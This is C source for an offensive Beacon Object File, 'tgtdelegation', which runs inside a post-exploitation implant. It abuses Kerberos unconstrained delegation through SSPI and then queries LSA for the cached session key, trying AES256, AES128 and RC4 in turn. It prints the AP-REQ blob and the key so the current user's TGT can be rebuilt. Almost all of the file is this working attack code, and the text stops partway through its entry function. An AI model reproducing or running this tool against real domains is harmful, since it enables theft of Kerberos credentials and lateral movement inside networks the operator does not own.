// tgtdelegation: Beacon Object File (BOF) for using the fake TGT delegation trick to extract a TGT to obtain a usable .ccache or .kirbi
// Author: Connor McGarr (@33y0re)

// Satisfy sspi.h
#define SECURITY_WIN32

#include <windows.h>
#include <dsgetdc.h>
#include <lm.h>
#include <security.h>
#include <wincrypt.h>
#include <ntsecapi.h>
#include <wchar.h>
#include "Header Files/libc.h"
#include "Header Files/beacon.h"

// DsGetDcNameW's third parameter is GUID, but NULL is incompatible with GUID*, so the funciton is prototyped with a PVOID parameter
DSGETDCAPI DWORD WINAPI NETAPI32$DsGetDcNameW(LPCWSTR, LPCWSTR, PVOID, LPCWSTR, ULONG, PDOMAIN_CONTROLLER_INFOW*);

// Function declarations
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
WINBASEAPI DWORD WINAPI KERNEL32$GetEnvironmentVariableW(LPCWSTR, LPWSTR, DWORD);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetApiBufferFree(LPVOID);
WINBASEAPI int WINAPI KERNEL32$lstrlenA(LPCSTR);
WINBASEAPI int WINAPI KERNEL32$lstrlenW(LPCWSTR);
DECLSPEC_IMPORT int WINAPI MSVCRT$wcscmp(const wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int WINAPI MSVCRT$swprintf_s(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$AcquireCredentialsHandleW(SEC_WCHAR*, SEC_WCHAR*, ULONG, PLUID, PVOID, SEC_GET_KEY_FN, PVOID, PCredHandle, PTimeStamp);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$InitializeSecurityContextW(PCredHandle, PCtxtHandle, SEC_WCHAR*, ULONG, ULONG, ULONG, PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, PTimeStamp);
WINIMPM BOOL WINAPI CRYPT32$CryptBinaryToStringA(CONST BYTE*, DWORD, DWORD, LPSTR, DWORD*);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$FreeCredentialsHandle(PCredHandle);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$FreeContextBuffer(PVOID);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaConnectUntrusted(PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaLookupAuthenticationPackage(HANDLE, PLSA_STRING, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaCallAuthenticationPackage(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
NTSYSAPI VOID WINAPI NTDLL$RtlMoveMemory(PVOID, const VOID*, SIZE_T);
WINBASEAPI HLOCAL WINAPI KERNEL32$LocalAlloc(UINT, SIZE_T);
WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer(PVOID);
DECLSPEC_IMPORT void WINAPI MSVCRT$free(void*);

// https://github.com/gentilkiwi/kekeo/blob/8326af87720e6743cd978a5962da8b2b81fa284a/kekeo/modules/kuhl_m_tgt.c#L190
// https://github.com/GhostPack/Rubeus/blob/afa7ca11a0695196781e920df047bd1951a6b47f/Rubeus/lib/LSA.cs#L1127

// Create a buffer with the total size needed for the SPN
// DNS names can only be 256 (MAX_PATH) in size
// Must initialize to a non-zero value to avoid a .bss section from being generated, which BOFs cannot handle
wchar_t targetSPN[MAX_PATH] = { 1 };

LPCWSTR getDC(wchar_t* domainName)
{
	// Create a variable with the string ERROR
	wchar_t* error = L"ERROR";

	// Parameters needed for call to DsGetDcNameA
	PDOMAIN_CONTROLLER_INFOW dcInfo = NULL;

	// Call DsGetDcNameA
	DWORD getdcName = NETAPI32$DsGetDcNameW(
		NULL,
		(LPCWSTR)domainName,
		NULL,
		NULL,
		DS_RETURN_DNS_NAME | DS_IP_REQUIRED,
		&dcInfo
	);

	// Error handling
	if (getdcName != ERROR_SUCCESS)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! Unable to resolve the DC for %S. Error: 0x%lx\n", domainName, KERNEL32$GetLastError());

		// Free the buffer
		NET_API_STATUS freeBuffer = NETAPI32$NetApiBufferFree(
			dcInfo
		);

		return (LPCWSTR)error;
	}
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Found a DC for the domain %S!\n[+] DC: %S\n", domainName, dcInfo->DomainControllerName);

		// Store the DC name in a variable
		LPCWSTR dcName = dcInfo->DomainControllerName;

		// Free the buffer
		NET_API_STATUS freeBuffer = NETAPI32$NetApiBufferFree(
			dcInfo
		);

		// Return value
		return (LPCWSTR)dcName;
	}
}

wchar_t* createTicket(LPCWSTR domainController)
{
	// Create a variable with the string ERROR
	wchar_t* error1 = L"ERROR";

	// Create a variable to store the first part of the SPN
	wchar_t* temp = L"CIFS/";

	// First, get the size of the DC DNS name and the size of
	int dcSize = KERNEL32$lstrlenW(domainController);
	int tempSize = KERNEL32$lstrlenW((LPCWSTR)temp);

	// Concatenate the buffers
	int concatStrings = MSVCRT$swprintf_s(targetSPN, MAX_PATH, L"CIFS/%s", domainController+2);

	// Error handling
	if (concatStrings == -1)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! Could not concatenate the SPN. Error: 0x%lx\n", KERNEL32$GetLastError());
	}
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Target SPN: %S\n", targetSPN);
		return (wchar_t*)targetSPN;
	}
}

int forgeTGT(wchar_t* spn, unsigned int nonce)
{
	// Define an integer that acts as an error code
	int error2 = 1;

	// Parameter needed for call to AcquireCredentialsHandleA
	CredHandle hCredential;
	TimeStamp tsExpiry;

	// Obtain a handle to preexisting credentials
	SECURITY_STATUS getHandle = SECUR32$AcquireCredentialsHandleW(
		NULL,
		MICROSOFT_KERBEROS_NAME,
		SECPKG_CRED_OUTBOUND,
		NULL,
		NULL,
		NULL,
		NULL,
		&hCredential,
		&tsExpiry
	);

	// Error handling
	if (getHandle == SEC_E_INSUFFICIENT_MEMORY)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! Not enough memory available to obtain a handle to the current credentials.\n");

			// Return an error
			return error2;
	}
	else if (getHandle == SEC_E_INTERNAL_ERROR)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! An error occurred that did not map to an SSPI error code.\n");

		// Return an error
		return error2;
	}
	else if (getHandle == SEC_E_NO_CREDENTIALS)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! No credentials are available.\n");

		// Return an error
		return error2;
	}
	else if (getHandle == SEC_E_NOT_OWNER)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! You don't have the necessary credentials.\n");

		// Return an error
		return error2;
	}
	else if (getHandle == SEC_E_SECPKG_NOT_FOUND)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! The requested security package does not exist.\n");

		// Return an error
		return error2;
	}
	else if (getHandle == SEC_E_UNKNOWN_CREDENTIALS)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! The supplied credentials were not recognized.\n");

		// Return an error
		return error2;
	}
	else if (getHandle == SEC_E_OK)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully obtained a handle to the current credentials set!\n");

		// Parameters needed for call to InitializeSecurityContextA
		CtxtHandle newContext;
		SecBuffer secbufPointer = { 0, SECBUFFER_TOKEN, NULL };
		SecBufferDesc output = { SECBUFFER_VERSION, 1, &secbufPointer };
		ULONG contextAttr;
		TimeStamp expiry;

		// Initiate outbound security context via credential handle
		SECURITY_STATUS initSecurity = SECUR32$InitializeSecurityContextW(
			&hCredential,
			NULL,
			(SEC_WCHAR*)spn,
			ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH,
			0,
			SECURITY_NATIVE_DREP,
			NULL,
			0,
			&newContext,
			&output,
			&contextAttr,
			NULL
		);

		// Error handling
		if (initSecurity == SEC_E_OK || initSecurity == SEC_I_CONTINUE_NEEDED)
		{
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully initialized the Kerberos GSS-API!\n");

			// InitializeSecurityContextA returns the attributes of the established security context
			// Using bitwise AND to ensure delegation is possible
			if (contextAttr & ISC_REQ_DELEGATE)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[+] The delegation request was successful! AP-REQ ticket is now in the GSS-API output.\n");

				// Parameter needed for call to CryptBinaryToStringA
				DWORD destSize;

				// Base64 encode the entire AP-REQ blob and output it
				BOOL base64 = CRYPT32$CryptBinaryToStringA(
					(CONST BYTE*)secbufPointer.pvBuffer,
					(DWORD)secbufPointer.cbBuffer,
					CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
					NULL,
					&destSize
				);

				// destSize should contain the size of the output buffer
				char* base64String = (char*)MSVCRT$malloc((SIZE_T)destSize);

				// malloc error handling
				if (base64String == NULL)
				{
					BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate a buffer to Base64 encode the AP-REQ blob! Error: 0x%lx\n", KERNEL32$GetLastError());

					// Return an error
					return error2;
				}
				else
				{
					// Base64 encode the entire AP-REQ blob and output it
					BOOL base64 = CRYPT32$CryptBinaryToStringA(
						(CONST BYTE*)secbufPointer.pvBuffer,
						(DWORD)secbufPointer.cbBuffer,
						CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
						base64String,
						&destSize
					);

					// Error handling
					if (!base64)
					{
						BeaconPrintf(CALLBACK_ERROR, "Error! Unable to Base64 encode the AP-REQ blob! Error: 0x%lx\n", KERNEL32$GetLastError());

						// Free the buffer
						MSVCRT$free(
							base64String
						);

						// Return an error
						return error2;
					}
					else
					{
						// In order to decrypt the AP-REQ response offline, we need the cached session key
						// There are 3 common encryption types for Kerberos: RC4_HMAC, AES128, and AES256
						// Using LSA functions to obtain the Kerberos session key and trying each of the three encryption types until one is successful (due to the inability to parse ASN1 structures in a BOF)
						// https://github.com/gentilkiwi/kekeo/blob/8326af87720e6743cd978a5962da8b2b81fa284a/kekeo/modules/kuhl_m_tgt.c#L598
						// AES 256 = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 (18)
						// AES 128 = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96 (17)
						// RC4 HMAC = KERB_ETYPE_RC4_HMAC_NT (23)

						// Parameters needed for calls to LsaConnectUntrusted, LsaLookupAuthenticationPackage, and LsaCallAuthenticationPackage
						NTSTATUS statusSuccess = (NTSTATUS)0x00000000;
						NTSTATUS nopackageError = (NTSTATUS)0xC00000FE;
						NTSTATUS namelengthError = (NTSTATUS)0xC0000106;
						HANDLE lsaHandle;
						LSA_STRING kerbPackage;
						kerbPackage.Buffer = (PUCHAR)MICROSOFT_KERBEROS_NAME_A;
						kerbPackage.Length = (USHORT)KERNEL32$lstrlenA(kerbPackage.Buffer);
						kerbPackage.MaximumLength = kerbPackage.Length + 1;
						ULONG authpackageId;
						PKERB_RETRIEVE_TKT_REQUEST retrieveRequest = NULL;
						PKERB_RETRIEVE_TKT_RESPONSE retrieveResponse = NULL;
						ULONG bufferLength;
						ULONG returnLength;
						NTSTATUS packageStatus = 0;

						// Establish an untrusted connection to the LSA server
						NTSTATUS establishConnection = SECUR32$LsaConnectUntrusted(
							&lsaHandle
						);

						// Error handling
						if (establishConnection == statusSuccess)
						{
							// Call LsaLookupAuthenticationPackage
							NTSTATUS lookupPackage = SECUR32$LsaLookupAuthenticationPackage(
								lsaHandle,
								&kerbPackage,
								&authpackageId
							);

							// Error handling
							if (lookupPackage == nopackageError)
							{
								BeaconPrintf(CALLBACK_ERROR, "Error! The specified authentication package is unknown to the LSA!\n");

								// Free the buffer
								MSVCRT$free(
									base64String
								);

								// Release the handle to the credentials
								SECUR32$FreeCredentialsHandle(
									&hCredential
								);

								// Return an error
								return error2;
							}
							else if (lookupPackage == namelengthError)
							{
								BeaconPrintf(CALLBACK_ERROR, "Error! The authentication package name exceeded 127 bytes!\n");

								// Free the buffer
								MSVCRT$free(
									base64String
								);

								// Release the handle to the credentials
								SECUR32$FreeCredentialsHandle(
									&hCredential
								);

								// Return an error
								return error2;
							}
							else if (lookupPackage == statusSuccess)
							{
								// Get the size of the SPN
								int getspnSize = KERNEL32$lstrlenW(spn);

								// Get the size of the SPN in wide string format
								USHORT newspnSize = (USHORT)((KERNEL32$lstrlenW((LPCWSTR)spn) + 1) * sizeof(wchar_t));

								// Set the size of the output buffer
								bufferLength = sizeof(KERB_RETRIEVE_TKT_REQUEST) + newspnSize;

								// Initialize the PKERB_RETRIEVE_TKT_REQUEST structure
								retrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)KERNEL32$LocalAlloc(LPTR, bufferLength);

								// Error handling
								if (retrieveRequest == NULL)
								{
									BeaconPrintf(CALLBACK_ERROR, "Error! Unable to initialize the PKERB_RETRIEVE_TKT_REQUEST structure. Error: 0x%lx\n", KERNEL32$GetLastError());

									// Free the buffer
									MSVCRT$free(
										base64String
									);

									// Release the handle to the credentials
									SECUR32$FreeCredentialsHandle(
										&hCredential
									);

									// Return an error
									return error2;
								}
								else
								{
									// Set members of PKERB_RETRIEVE_TKT_REQUEST with AES256 (18)
									retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
									retrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
									retrieveRequest->EncryptionType = 18;
									retrieveRequest->TargetName.Length = newspnSize - sizeof(wchar_t);
									retrieveRequest->TargetName.MaximumLength = newspnSize;
									retrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE)retrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));

									// Copy to UNICODE_STRING buffer member for TargetName
									NTDLL$RtlMoveMemory(retrieveRequest->TargetName.Buffer, spn, retrieveRequest->TargetName.MaximumLength);

									// Call LsaCallAuthenticationPackage with AES256
									NTSTATUS callauthPkg = SECUR32$LsaCallAuthenticationPackage(
										lsaHandle,
										authpackageId,
										(PVOID)retrieveRequest,
										bufferLength,
										(PVOID*)&retrieveResponse,
										&returnLength,
										&packageStatus
									);

									// Error handling
									if (callauthPkg == statusSuccess)
									{
										if (packageStatus == statusSuccess)
										{
											BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully invoked LsaCallAuthenticationPackage! The Kerberos session key should be cached!\n");

											// Create a buffer for the session key value
											PVOID sessionkeynob64 = (PVOID)MSVCRT$malloc((SIZE_T)retrieveResponse->Ticket.SessionKey.Length);

											// malloc error handling
											if (sessionkeynob64 == NULL)
											{
												BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory for the Kerberos session key. Error: 0x%lx\n", KERNEL32$GetLastError());

												// Free the allocation
												KERNEL32$LocalFree(
													retrieveRequest
												);

												// Free the buffer
												MSVCRT$free(
													base64String
												);

												// Free the allocation
												SECUR32$LsaFreeReturnBuffer(
													(PVOID)retrieveResponse
												);

												// Release the handle to the credentials
												SECUR32$FreeCredentialsHandle(
													&hCredential
												);

												// Return an error
												return error2;
											}
											else
											{
												// Copy the session key value to the buffer
												NTDLL$RtlMoveMemory(sessionkeynob64, retrieveResponse->Ticket.SessionKey.Value, retrieveResponse->Ticket.SessionKey.Length);

												// Base64 encode the Kerberos session key and output it
												BOOL base641 = CRYPT32$CryptBinaryToStringA(
													(CONST BYTE*)sessionkeynob64,
													(DWORD)retrieveResponse->Ticket.SessionKey.Length,
													CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
													NULL,
													&destSize
												);

												// destSize should contain the size of the output buffer
												LPSTR sessionKey = (LPSTR)MSVCRT$malloc((SIZE_T)destSize);

												// malloc error handling
												if (sessionKey == NULL)
												{
													BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory for the Kerberos session key. Error: 0x%lx\n", KERNEL32$GetLastError());

													// Free the allocation
													KERNEL32$LocalFree(
														retrieveRequest
													);

													// Free the buffer
													MSVCRT$free(
														base64String
													);

													// Free the allocation
													SECUR32$LsaFreeReturnBuffer(
														(PVOID)retrieveResponse
													);

													// Release the handle to the credentials
													SECUR32$FreeCredentialsHandle(
														&hCredential
													);

													// Return an error
													return error2;
												}
												else
												{
													// Base64 encode the Kerberos session key and output it
													BOOL base641 = CRYPT32$CryptBinaryToStringA(
														(CONST BYTE*)sessionkeynob64,
														(DWORD)retrieveResponse->Ticket.SessionKey.Length,
														CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
														sessionKey,
														&destSize
													);

													// Error handling
													if (!base641)
													{
														BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory for the Kerberos session key. Error: 0x%lx\n", KERNEL32$GetLastError());

														// Free the allocation
														KERNEL32$LocalFree(
															retrieveRequest
														);

														// Free the buffer
														MSVCRT$free(
															base64String
														);

														// Free the buffer
														MSVCRT$free(
															sessionKey
														);

														// Free the allocation
														SECUR32$LsaFreeReturnBuffer(
															(PVOID)retrieveResponse
														);

														// Release the handle to the credentials
														SECUR32$FreeCredentialsHandle(
															&hCredential
														);

														// Return an error
														return error2;
													}
													else
													{
														BeaconPrintf(CALLBACK_OUTPUT, "[+] Job nonce: %lu\n\n[+] AP-REQ output:\n%s\n\n[+] Kerberos session key: \n%s\n\n[+] Encryption:\nAES256\n", nonce, base64String, sessionKey);

														// Free the allocation
														KERNEL32$LocalFree(
															retrieveRequest
														);

														// Free the buffer
														MSVCRT$free(
															base64String
														);

														// Free the buffer
														MSVCRT$free(
															sessionKey
														);

														// Free the allocation
														SECUR32$LsaFreeReturnBuffer(
															(PVOID)retrieveResponse
														);

														// Release the handle to the credentials
														SECUR32$FreeCredentialsHandle(
															&hCredential
														);

														// Return success
														return 0;
													}
												}
											}
										}
										else if (packageStatus == 0xC0000034)
										{
											// Set the encryption type to AES128 and try again
											retrieveRequest->EncryptionType = 17;

											// Create a new ProtocolStatus variable
											NTSTATUS packageStatus1 = 0;

											// Call LsaCallAuthenticationPackage with AES128
											NTSTATUS callauthPkg = SECUR32$LsaCallAuthenticationPackage(
												lsaHandle,
												authpackageId,
												(PVOID)retrieveRequest,
												bufferLength,
												(PVOID*)&retrieveResponse,
												&returnLength,
												&packageStatus1
											);

											// Error handling
											if (packageStatus1 == statusSuccess)
											{
												BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully invoked LsaCallAuthenticationPackage! The Kerberos session key should be cached!\n");

												// Create a buffer for the session key value
												PVOID sessionkeynob64 = (PVOID)MSVCRT$malloc((SIZE_T)retrieveResponse->Ticket.SessionKey.Length);

												// malloc error handling
												if (sessionkeynob64 == NULL)
												{
													BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory for the Kerberos session key. Error: 0x%lx\n", KERNEL32$GetLastError());

													// Free the allocation
													KERNEL32$LocalFree(
														retrieveRequest
													);

													// Free the buffer
													MSVCRT$free(
														base64String
													);

													// Free the allocation
													SECUR32$LsaFreeReturnBuffer(
														(PVOID)retrieveResponse
													);

													// Release the handle to the credentials
													SECUR32$FreeCredentialsHandle(
														&hCredential
													);

													// Return an error
													return error2;
												}
												else
												{
													// Copy the session key value to the buffer
													NTDLL$RtlMoveMemory(sessionkeynob64, retrieveResponse->Ticket.SessionKey.Value, retrieveResponse->Ticket.SessionKey.Length);

													// Base64 encode the Kerberos session key and output it
													BOOL base641 = CRYPT32$CryptBinaryToStringA(
														(CONST BYTE*)sessionkeynob64,
														(DWORD)retrieveResponse->Ticket.SessionKey.Length,
														CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
														NULL,
														&destSize
													);

													// destSize should contain the size of the output buffer
													LPSTR sessionKey = (LPSTR)MSVCRT$malloc((SIZE_T)destSize);

													// malloc error handling
													if (sessionKey == NULL)
													{
														BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory for the Kerberos session key. Error: 0x%lx\n", KERNEL32$GetLastError());

														// Free the allocation
														KERNEL32$LocalFree(
															retrieveRequest
														);

														// Free the buffer
														MSVCRT$free(
															base64String
														);

														// Free the allocation
														SECUR32$LsaFreeReturnBuffer(
															(PVOID)retrieveResponse
														);

														// Release the handle to the credentials
														SECUR32$FreeCredentialsHandle(
															&hCredential
														);

														// Return an error
														return error2;
													}
													else
													{
														// Base64 encode the Kerberos session key and output it
														BOOL base641 = CRYPT32$CryptBinaryToStringA(
															(CONST BYTE*)sessionkeynob64,
															(DWORD)retrieveResponse->Ticket.SessionKey.Length,
															CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
															sessionKey,
															&destSize
														);

														// Error handling
														if (!base641)
														{
															BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory for the Kerberos session key. Error: 0x%lx\n", KERNEL32$GetLastError());

															// Free the allocation
															KERNEL32$LocalFree(
																retrieveRequest
															);

															// Free the buffer
															MSVCRT$free(
																base64String
															);

															// Free the buffer
															MSVCRT$free(
																sessionKey
															);

															// Free the allocation
															SECUR32$LsaFreeReturnBuffer(
																(PVOID)retrieveResponse
															);

															// Release the handle to the credentials
															SECUR32$FreeCredentialsHandle(
																&hCredential
															);

															// Return an error
															return error2;
														}
														else
														{
															BeaconPrintf(CALLBACK_OUTPUT, "[+] Job nonce: %lu\n\n[+] AP-REQ output:\n%s\n\n[+] Kerberos session key: \n%s\n\n[+] Encryption:\nAES128\n", nonce, base64String, sessionKey);

															// Free the allocation
															KERNEL32$LocalFree(
																retrieveRequest
															);

															// Free the buffer
															MSVCRT$free(
																base64String
															);

															// Free the buffer
															MSVCRT$free(
																sessionKey
															);

															// Free the allocation
															SECUR32$LsaFreeReturnBuffer(
																(PVOID)retrieveResponse
															);

															// Release the handle to the credentials
															SECUR32$FreeCredentialsHandle(
																&hCredential
															);

															// Return success
															return 0;
														}
													}
												}
											}
											else if (packageStatus1 == 0xC0000034)
											{
												// Set the encryption type to RC4_HMAC and try again
												retrieveRequest->EncryptionType = 23;

												// Create a new ProtocolStatus variable
												NTSTATUS packageStatus2 = 0;

												// Call LsaCallAuthenticationPackage with RC4_HMAC
												NTSTATUS callauthPkg = SECUR32$LsaCallAuthenticationPackage(
													lsaHandle,
													authpackageId,
													(PVOID)retrieveRequest,
													bufferLength,
													(PVOID*)&retrieveResponse,
													&returnLength,
													&packageStatus1
												);

												if (packageStatus2 == statusSuccess)
												{
													BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully invoked LsaCallAuthenticationPackage! The Kerberos session key should be cached!\n");

													// Create a buffer for the session key value
													PVOID sessionkeynob64 = (PVOID)MSVCRT$malloc((SIZE_T)retrieveResponse->Ticket.SessionKey.Length);

													// malloc error handling
													if (sessionkeynob64 == NULL)
													{
														BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory for the Kerberos session key. Error: 0x%lx\n", KERNEL32$GetLastError());

														// Free the allocation
														KERNEL32$LocalFree(
															retrieveRequest
														);

														// Free the buffer
														MSVCRT$free(
															base64String
														);

														// Free the allocation
														SECUR32$LsaFreeReturnBuffer(
															(PVOID)retrieveResponse
														);

														// Release the handle to the credentials
														SECUR32$FreeCredentialsHandle(
															&hCredential
														);

														// Return an error
														return error2;
													}
													else
													{
														// Copy the session key value to the buffer
														NTDLL$RtlMoveMemory(sessionkeynob64, retrieveResponse->Ticket.SessionKey.Value, retrieveResponse->Ticket.SessionKey.Length);

														// Base64 encode the Kerberos session key and output it
														BOOL base641 = CRYPT32$CryptBinaryToStringA(
															(CONST BYTE*)sessionkeynob64,
															(DWORD)retrieveResponse->Ticket.SessionKey.Length,
															CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
															NULL,
															&destSize
														);

														// destSize should contain the size of the output buffer
														LPSTR sessionKey = (LPSTR)MSVCRT$malloc((SIZE_T)destSize);

														// malloc error handling
														if (sessionKey == NULL)
														{
															BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory for the Kerberos session key. Error: 0x%lx\n", KERNEL32$GetLastError());

															// Free the allocation
															KERNEL32$LocalFree(
																retrieveRequest
															);

															// Free the buffer
															MSVCRT$free(
																base64String
															);

															// Free the allocation
															SECUR32$LsaFreeReturnBuffer(
																(PVOID)retrieveResponse
															);

															// Release the handle to the credentials
															SECUR32$FreeCredentialsHandle(
																&hCredential
															);

															// Return an error
															return error2;
														}
														else
														{
															// Base64 encode the Kerberos session key and output it
															BOOL base641 = CRYPT32$CryptBinaryToStringA(
																(CONST BYTE*)sessionkeynob64,
																(DWORD)retrieveResponse->Ticket.SessionKey.Length,
																CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
																sessionKey,
																&destSize
															);

															// Error handling
															if (!base641)
															{
																BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory for the Kerberos session key. Error: 0x%lx\n", KERNEL32$GetLastError());

																// Free the allocation
																KERNEL32$LocalFree(
																	retrieveRequest
																);

																// Free the buffer
																MSVCRT$free(
																	base64String
																);

																// Free the buffer
																MSVCRT$free(
																	sessionKey
																);

																// Free the allocation
																SECUR32$LsaFreeReturnBuffer(
																	(PVOID)retrieveResponse
																);

																// Release the handle to the credentials
																SECUR32$FreeCredentialsHandle(
																	&hCredential
																);

																// Return an error
																return error2;
															}
															else
															{
																BeaconPrintf(CALLBACK_OUTPUT, "[+] Job nonce: %lu\n\n[+] AP-REQ output:\n%s\n\n[+] Kerberos session key: \n%s\n\n[+] Encryption:\nRC4\n", nonce, base64String, sessionKey);

																// Free the allocation
																KERNEL32$LocalFree(
																	retrieveRequest
																);

																// Free the buffer
																MSVCRT$free(
																	base64String
																);

																// Free the buffer
																MSVCRT$free(
																	sessionKey
																);

																// Free the allocation
																SECUR32$LsaFreeReturnBuffer(
																	(PVOID)retrieveResponse
																);

																// Release the handle to the credentials
																SECUR32$FreeCredentialsHandle(
																	&hCredential
																);

																// Return success
																return 0;
															}
														}
													}
												}
												else
												{
													BeaconPrintf(CALLBACK_ERROR, "Error! Unable to invoke LsaCallAuthenticationPackage! ProtocolStatus: 0x%lx\n", packageStatus2);

													// Free the buffer
													MSVCRT$free(
														base64String
													);

													// Free the allocation
													KERNEL32$LocalFree(
														retrieveRequest
													);

													// Release the handle to the credentials
													SECUR32$FreeCredentialsHandle(
														&hCredential
													);

													// Return an error
													return error2;
												}
											}
											else
											{
												BeaconPrintf(CALLBACK_ERROR, "Error! Unable to invoke LsaCallAuthenticationPackage! ProtocolStatus: 0x%lx\n", packageStatus1);

												// Free the buffer
												MSVCRT$free(
													base64String
												);

												// Free the allocation
												KERNEL32$LocalFree(
													retrieveRequest
												);

												// Release the handle to the credentials
												SECUR32$FreeCredentialsHandle(
													&hCredential
												);

												// Return an error
												return error2;
											}
										}
										else
										{
											BeaconPrintf(CALLBACK_ERROR, "Error! Unable to invoke LsaCallAuthenticationPackage! ProtocolStatus: 0x%lx\n", packageStatus);

											// Free the buffer
											MSVCRT$free(
												base64String
											);

											// Free the allocation
											KERNEL32$LocalFree(
												retrieveRequest
											);

											// Release the handle to the credentials
											SECUR32$FreeCredentialsHandle(
												&hCredential
											);

											// Return an error
											return error2;
										}
									}
									else
									{
										BeaconPrintf(CALLBACK_ERROR, "Error! Unable to invoke LsaCallAuthenticationPackage! NTSTATUS: 0x%lx\n", callauthPkg);

										// Free the buffer
										MSVCRT$free(
											base64String
										);

										// Free the allocation
										KERNEL32$LocalFree(
											retrieveRequest
										);

										// Release the handle to the credentials
										SECUR32$FreeCredentialsHandle(
											&hCredential
										);

										// Return an error
										return error2;
									}
								}
							}
						}
					}
				}
			}
			else
			{
				BeaconPrintf(CALLBACK_ERROR, "Error! Client is not allowed to delegate to the target SPN.\n");

				// Release the handle to the credentials
				SECUR32$FreeCredentialsHandle(
					&hCredential
				);

				// Return an error
				return error2;
			}
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "Error! Error initializing the Kerberos GSS-API. Error: 0x%lx\n", KERNEL32$GetLastError());

			// Release the handle to the credentials
			SECUR32$FreeCredentialsHandle(
				&hCredential
			);

			// Return an error
			return error2;
		}
	}
}

void go(char* argc, int len)
{
	// Parameters needed for BOFs to take in input
	// datap is a typedef'd structure
	datap parser;

	// Parse arguments
	BeaconDataParse(&parser, argc, len);

	// Create a string with the target environmental variable in preperation for no domain being specified
	LPCWSTR envVariable = L"USERDNSDOMAIN";
	wchar_t domainnameEnv[MAX_PATH];

	// Store the job nonce
	unsigned int jobNonce = (unsigned int)BeaconDataInt(&parser);

	// Store the desired domain name
	wchar_t* domainnameArg = (wchar_t*)BeaconDataExtract(&parser, NULL);

	// Store the target SPN
	wchar_t* usersuppliedSpn = (wchar_t*)BeaconDataExtract(&parser, NULL);

	// Was a domain specified?
	if (MSVCRT$wcscmp((const wchar_t*)domainnameArg, L"currentdomain") == 0)
	{
		BeaconPrintf(CALLBACK_OUTPUT,"[+] No domain specified! Using the USERDNSDOMAIN environmental variable...\n");

		// Get the current domain if none specified
		DWORD getdcnoArg = KERNEL32$GetEnvironmentVariableW(
			envVariable,
			(LPWSTR)domainnameEnv,
			(DWORD)MAX_PATH
		);

		// Error handling
		if (getdcnoArg == 0)
		{
			BeaconPrintf(CALLBACK_ERROR, "Error! Unable to get the current domain. Please try again or try specifying a domain.\n");
		}
		else
		{
			// Get the DC DNS name
			LPCWSTR domaincontrollerArg = getDC((wchar_t*)domainnameEnv);

			// Error handling
			if (MSVCRT$wcscmp((const wchar_t*)domaincontrollerArg, L"ERROR") == 0)
			{
				BeaconPrintf(CALLBACK_ERROR,"Error! tgtdelegation failed!\n");
			}
			else
			{
				// Was a SPN specified?
				if (MSVCRT$wcscmp((const wchar_t*)usersuppliedSpn, L"default") == 0)
				{
					BeaconPrintf(CALLBACK_OUTPUT,"[+] No SPN specified! Using default SPN...\n");

					// Get the default SPN, since no user-supplied SPN was specified
